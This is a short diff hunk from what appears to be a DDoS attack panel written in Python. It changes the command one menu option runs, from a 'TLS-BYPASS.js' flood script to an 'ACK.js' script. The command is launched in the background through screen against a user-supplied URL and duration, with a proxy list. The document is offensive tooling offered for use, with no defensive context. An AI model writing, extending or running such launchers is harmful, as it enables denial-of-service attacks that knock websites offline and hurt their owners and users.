@@ -432,7 +432,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node TLS-BYPASS.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node ACK.js {url} {duration} 64 2 proxy.txt')
                     
             except ValueError:
                 main()
